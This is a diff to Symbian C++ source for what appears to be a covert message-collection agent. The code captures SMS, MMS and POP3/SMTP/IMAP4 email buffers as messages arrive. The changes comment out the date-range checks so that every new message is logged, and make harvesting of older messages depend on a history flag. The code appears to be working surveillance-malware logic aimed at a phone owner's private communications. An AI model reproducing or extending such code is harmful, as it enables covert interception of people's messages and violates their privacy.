@@ -115,7 +115,18 @@ void CAgentMessages::FillFilter(CMessageFilter* aFilter, const TAgentClassFilter
 		aFilter->iUntilFilter = aFilterHeader.iDoFilterToDate;
 		if (aFilter->iSinceFilter)
 			{
-			aFilter->SetStartDate(aFilterHeader.iFromDate);
+			if(aFilterHeader.iHistory)
+				{
+				//collect data starting from datefrom
+				aFilter->SetStartDate(aFilterHeader.iFromDate);
+				}
+			else
+				{
+				//do not collect data
+				TTime now;
+				now.UniversalTime();
+				aFilter->SetStartDate(now);
+				}
 			}
 		/*
 		else 
@@ -1092,7 +1103,7 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 				// sms
 				if(msvEntry.iMtm == KUidMsgTypeSMS)
 				{ 
-					if(iSmsRuntimeFilter->iLog && iSmsRuntimeFilter->MessageInRange(msvEntry.iDate))
+					if(iSmsRuntimeFilter->iLog /*&& iSmsRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
 					{
 						RBuf8 buf(GetSMSBufferL(msvEntry,msvId));
 						buf.CleanupClosePushL();
@@ -1117,7 +1128,7 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 				// mms
 				else if(msvEntry.iMtm == KUidMsgTypeMultimedia)
 					{
-						if(iMmsRuntimeFilter->iLog && iMmsRuntimeFilter->MessageInRange(msvEntry.iDate))
+						if(iMmsRuntimeFilter->iLog /*&& iMmsRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
 						{
 							RBuf8 buf(GetMMSBufferL(msvEntry,msvId));
 							buf.CleanupClosePushL();
@@ -1142,7 +1153,7 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 				// mail
 				else if((msvEntry.iMtm == KUidMsgTypePOP3) || (msvEntry.iMtm == KUidMsgTypeSMTP) || (msvEntry.iMtm == KUidMsgTypeIMAP4))
 					{ 
-						if(iMailRuntimeFilter->iLog && iMailRuntimeFilter->MessageInRange(msvEntry.iDate))
+						if(iMailRuntimeFilter->iLog /*&& iMailRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
 						{
 							RBuf8 buf(GetMailBufferL(msvEntry,msvId,iMailRuntimeFilter));
 							buf.CleanupClosePushL();
@@ -1199,7 +1210,7 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 			{
 				if(msvEntry.iMtm == KUidMsgTypeSMS) 
 				{
-					if(iSmsRuntimeFilter->iLog && iSmsRuntimeFilter->MessageInRange(msvEntry.iDate))
+					if(iSmsRuntimeFilter->iLog /*&& iSmsRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
 					{
 						RBuf8 buf(GetSMSBufferL(msvEntry,msvId));
 						buf.CleanupClosePushL();
@@ -1223,7 +1234,7 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 			}
 			else if(msvEntry.iMtm == KUidMsgTypeMultimedia) 
 				{
-					if(iMmsRuntimeFilter->iLog && iMmsRuntimeFilter->MessageInRange(msvEntry.iDate))
+					if(iMmsRuntimeFilter->iLog /*&& iMmsRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
 					{
 						RBuf8 buf(GetMMSBufferL(msvEntry,msvId));
 						buf.CleanupClosePushL();
@@ -1247,7 +1258,7 @@ void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, T
 			// mail
 			else if((msvEntry.iMtm == KUidMsgTypePOP3) || (msvEntry.iMtm == KUidMsgTypeSMTP) || (msvEntry.iMtm == KUidMsgTypeIMAP4))
 				{ 
-					if(iMailRuntimeFilter->iLog && iMailRuntimeFilter->MessageInRange(msvEntry.iDate))
+					if(iMailRuntimeFilter->iLog /*&& iMailRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
 					{
 						RBuf8 buf(GetMailBufferL(msvEntry,msvId,iMailRuntimeFilter));
 						buf.CleanupClosePushL();
